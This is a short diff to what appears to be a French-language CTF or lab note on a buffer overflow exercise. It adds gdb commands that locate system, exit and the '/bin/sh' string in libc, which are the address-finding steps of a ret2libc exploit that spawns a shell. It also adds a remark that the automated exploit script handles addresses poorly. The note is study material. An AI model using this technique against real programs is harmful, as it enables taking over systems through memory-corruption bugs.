@@ -23,7 +23,23 @@ Overflow me
 76
 ```
 
+## Trouver system - exit - /bin/sh
+
+```bash
+p system
+```
+
+```bash
+p exit
+```
+
+```bash
+find __libc_start_main,+99999999,"/bin/sh"
+```
+
 ## Automatisation de l'exploitation
+
+Ça marche pas de ouf pour les addresses en fait. À corriger si le buffer est en argv[1] de plus.
 
 ```python
 # 32-bit
